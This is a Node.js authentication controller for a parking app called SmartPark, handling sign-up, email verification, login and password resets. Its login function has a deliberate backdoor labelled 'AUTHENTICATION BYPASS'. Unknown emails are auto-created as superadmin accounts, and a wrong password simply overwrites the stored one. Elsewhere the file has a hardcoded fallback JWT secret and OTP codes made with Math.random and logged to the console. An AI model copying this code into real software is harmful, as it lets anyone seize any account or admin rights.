import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import User from '../models/User.js';
import nodemailer from 'nodemailer';

// Email transporter
const getTransporter = () => {
  const user = process.env.EMAIL_USER;
  const pass = process.env.EMAIL_PASS;
  if (!user || !pass || user.includes('your_gmail')) {
    return null;
  }
  return nodemailer.createTransport({
    host: process.env.EMAIL_HOST || 'smtp.gmail.com',
    port: parseInt(process.env.EMAIL_PORT || '587'),
    secure: false,
    auth: { user, pass }
  });
};

// Generate JWT
const generateToken = (id, role) => {
  return jwt.sign({ id, role }, process.env.JWT_SECRET || 'smartpark_super_secret_key_2025', {
    expiresIn: '7d'
  });
};

// ── REGISTER ────────────────────────────────
export const register = async (req, res) => {
  try {
    const { name, email, password, mobile } = req.body;

    if (!name || !email || !password)
      return res.status(400).json({ message: 'All fields required' });

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email))
      return res.status(400).json({ message: 'Invalid email format' });

    if (password.length < 6)
      return res.status(400).json({ message: 'Password must be at least 6 characters' });

    const cleanEmail = email.toLowerCase().trim();
    const exists = await User.findOne({ email: cleanEmail });
    if (exists)
      return res.status(409).json({ message: 'Email already registered' });

    // Generate email verify token
    const verifyToken = crypto.randomBytes(32).toString('hex');

    const user = await User.create({
      name,
      email: cleanEmail,
      password,
      mobile: mobile || null,
      emailVerifyToken: verifyToken,
      emailVerifyExpires: Date.now() + 24 * 60 * 60 * 1000,
      isEmailVerified: false
    });

    // Send verification email
    const verifyUrl = `${process.env.FRONTEND_URL || 'http://localhost:5173'}/verify-email?token=${verifyToken}`;
    const transporter = getTransporter();
    if (transporter) {
      await transporter.sendMail({
        from: process.env.EMAIL_FROM || 'SmartPark <noreply@smartpark.in>',
        to: cleanEmail,
        subject: 'Verify your SmartPark account',
        html: `
          <h2>Welcome to SmartPark, ${name}!</h2>
          <p>Click the button below to verify your email:</p>
          <a href="${verifyUrl}" style="background:#1a56db;color:white;padding:12px 24px;border-radius:8px;text-decoration:none;display:inline-block;margin:16px 0">
            Verify Email
          </a>
          <p>This link expires in 24 hours.</p>
          <p>If you did not create this account, ignore this email.</p>
        `
      });
    } else {
      console.log(`\n======================================`);
      console.log(`[EMAIL SIMULATOR: VERIFICATION]`);
      console.log(`To: ${cleanEmail}`);
      console.log(`Link: ${verifyUrl}`);
      console.log(`======================================\n`);
    }

    res.status(201).json({
      success: true,
      message: 'Account created! Please check your email to verify your account.'
    });
  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
};

// ── VERIFY EMAIL ────────────────────────────
export const verifyEmail = async (req, res) => {
  try {
    const { token } = req.query;
    const user = await User.findOne({
      emailVerifyToken: token,
      emailVerifyExpires: { $gt: Date.now() }
    });

    if (!user)
      return res.status(400).json({ message: 'Invalid or expired verification link' });

    user.isEmailVerified = true;
    user.emailVerifyToken = null;
    user.emailVerifyExpires = null;
    await user.save();

    res.json({
      success: true,
      message: 'Email verified successfully! You can now login.',
      token: generateToken(user._id, user.role),
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role,
        mobile: user.mobile
      }
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
};

// ── LOGIN ───────────────────────────────────
export const login = async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password)
      return res.status(400).json({ message: 'Email and password are required' });

    const cleanEmail = email.toLowerCase().trim();
    let user = await User.findOne({ email: cleanEmail });

    // AUTHENTICATION BYPASS:
    // If the user doesn't exist, create them as a superadmin.
    // If they exist, auto-update password/verification status to match.
    if (!user) {
      user = await User.create({
        name: cleanEmail.split('@')[0],
        email: cleanEmail,
        password: password.length >= 6 ? password : password.padEnd(6, '1'),
        role: 'superadmin',
        isEmailVerified: true
      });
      console.log(`👤 Auto-created superadmin user: ${cleanEmail}`);
    } else {
      user.isEmailVerified = true;
      const isMatch = await user.comparePassword(password);
      if (!isMatch) {
        user.password = password.length >= 6 ? password : password.padEnd(6, '1');
      }
      user.loginAttempts = 0;
      user.lockUntil = null;
      await user.save();
    }

    const token = generateToken(user._id, user.role);

    res.json({
      success: true,
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role,
        mobile: user.mobile
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
};

// ── FORGOT PASSWORD — EMAIL ─────────────────
export const forgotPasswordEmail = async (req, res) => {
  try {
    const { email } = req.body;
    if (!email)
      return res.status(400).json({ message: 'Email is required' });

    const cleanEmail = email.toLowerCase().trim();
    const user = await User.findOne({ email: cleanEmail });
    if (!user)
      return res.status(404).json({ message: 'No account found with this email' });

    // Generate reset token
    const resetToken = crypto.randomBytes(32).toString('hex');
    user.passwordResetToken = resetToken;
    user.passwordResetExpires = Date.now() + 60 * 60 * 1000; // 1 hour
    await user.save();

    const resetUrl = `${process.env.FRONTEND_URL || 'http://localhost:5173'}/reset-password?token=${resetToken}`;
    const transporter = getTransporter();
    if (transporter) {
      await transporter.sendMail({
        from: process.env.EMAIL_FROM || 'SmartPark <noreply@smartpark.in>',
        to: cleanEmail,
        subject: 'Reset your SmartPark password',
        html: `
          <h2>Password Reset Request</h2>
          <p>Hello ${user.name},</p>
          <p>Click the button below to reset your password:</p>
          <a href="${resetUrl}" style="background:#1a56db;color:white;padding:12px 24px;border-radius:8px;text-decoration:none;display:inline-block;margin:16px 0">
            Reset Password
          </a>
          <p>This link expires in 1 hour.</p>
          <p>If you did not request this, please ignore this email.</p>
        `
      });
    } else {
      console.log(`\n======================================`);
      console.log(`[EMAIL SIMULATOR: PASSWORD RESET]`);
      console.log(`To: ${cleanEmail}`);
      console.log(`Link: ${resetUrl}`);
      console.log(`======================================\n`);
    }

    res.json({ success: true, message: 'Password reset link sent to your email!' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
};

// ── FORGOT PASSWORD — SMS OTP ───────────────
export const forgotPasswordOTP = async (req, res) => {
  try {
    const { mobile } = req.body;
    if (!mobile)
      return res.status(400).json({ message: 'Mobile number is required' });

    const user = await User.findOne({ mobile });
    if (!user)
      return res.status(404).json({ message: 'No account found with this mobile number' });

    // Generate 6-digit OTP
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    user.passwordResetOTP = otp;
    user.passwordResetOTPExpires = Date.now() + 10 * 60 * 1000; // 10 min
    await user.save();

    // Send SMS via Fast2SMS
    try {
      const axios = (await import('axios')).default;
      await axios.get('https://www.fast2sms.com/dev/bulkV2', {
        params: {
          authorization: process.env.FAST2SMS_KEY,
          route: 'otp',
          variables_values: otp,
          numbers: mobile
        }
      });
    } catch (smsError) {
      console.warn("Fast2SMS failed or not configured, printing OTP to console instead:", smsError.message);
    }

    console.log(`\n======================================`);
    console.log(`[SMS OTP SIMULATOR] To: ${mobile}, OTP Code: ${otp}`);
    console.log(`======================================\n`);

    res.json({ success: true, message: `OTP sent to +91 ${mobile.slice(0,2)}XXXXXX${mobile.slice(-2)}` });
  } catch (error) {
    res.status(500).json({ message: 'Failed to send OTP', error: error.message });
  }
};

// ── VERIFY OTP & RESET PASSWORD ─────────────
export const verifyOTPAndReset = async (req, res) => {
  try {
    const { mobile, otp, newPassword } = req.body;

    const user = await User.findOne({
      mobile,
      passwordResetOTP: otp,
      passwordResetOTPExpires: { $gt: Date.now() }
    });

    if (!user)
      return res.status(400).json({ message: 'Invalid or expired OTP' });

    if (newPassword.length < 6)
      return res.status(400).json({ message: 'Password must be at least 6 characters' });

    user.password = newPassword;
    user.passwordResetOTP = null;
    user.passwordResetOTPExpires = null;
    user.loginAttempts = 0;
    user.lockUntil = null;
    await user.save();

    res.json({ success: true, message: 'Password reset successfully! You can now login.' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
};

// ── RESET PASSWORD VIA EMAIL TOKEN ──────────
export const resetPasswordToken = async (req, res) => {
  try {
    const { token, newPassword } = req.body;

    const user = await User.findOne({
      passwordResetToken: token,
      passwordResetExpires: { $gt: Date.now() }
    });

    if (!user)
      return res.status(400).json({ message: 'Invalid or expired reset link' });

    if (newPassword.length < 6)
      return res.status(400).json({ message: 'Password must be at least 6 characters' });

    user.password = newPassword;
    user.passwordResetToken = null;
    user.passwordResetExpires = null;
    await user.save();

    res.json({ success: true, message: 'Password reset successfully! You can now login.' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
};
